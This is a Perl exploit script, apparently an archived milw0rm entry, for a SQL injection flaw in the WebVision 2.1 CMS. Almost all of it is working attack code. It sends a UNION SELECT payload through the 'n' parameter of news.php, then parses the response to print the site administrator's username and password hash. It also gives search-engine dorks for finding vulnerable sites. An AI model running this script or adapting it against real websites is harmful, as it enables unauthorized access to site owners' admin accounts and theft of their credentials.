#!/usr/bin/perl -w
# WebVision 2.1 (n) Remote SQL Injection Exploit
# Demo : http://www.webdev4all.nl/demowebsite/
# Dork : Webdevelopment Tinx-IT
# Dork2: Copyright © 2006-2008 Tinx-IT 
# and open your mind
# admin panel : www.target.com/path/cms
# Found by : Mr.tro0oqy <Yemeni ana>
# E-mail : t.4@windowslive.com
# special thank for my teacher "Stack"
########################################
system("color e");
print "\t\t0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0\n\n";
print "\t\t0 WebVision 2.1 (n) Remote SQL Injection Exploit 0\n\n";
print "\t\t0 by Mr.tro0oqy 0\n\n";
print "\t\t0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0\n\n";
use LWP::UserAgent;
die "Example: perl $0 http://target.com/path \n" unless @ARGV;
$user="name";
$pass="password";
$tab="users";
$b = LWP::UserAgent->new() or die "error\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . "/news.php?n=-1+union+select+1,2,concat(CHAR(60,117,115,101,114,62),".$user.",CHAR(60,117,115,101,114,62),CHAR(60,112,97,115,115,62),".$pass.",CHAR(60,112,97,115,115,62)),4,5,6,7,8,9,10,11,12,13+from+".$tab."--";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;
if ($answer =~ /<user>(.*?)<user>/){
  print "\ loading .....\n";
  print "\n[+] Admin User : $1";
}
if ($answer =~/<pass>(.*?)<pass>/)
{
print "\n[+] Admin Hash : $1\n\n";
print "\t\t# %100 #\n\n";}

else
{
print "\n[-] Exploit Failed...\n";
}

# milw0rm.com [2009-07-17]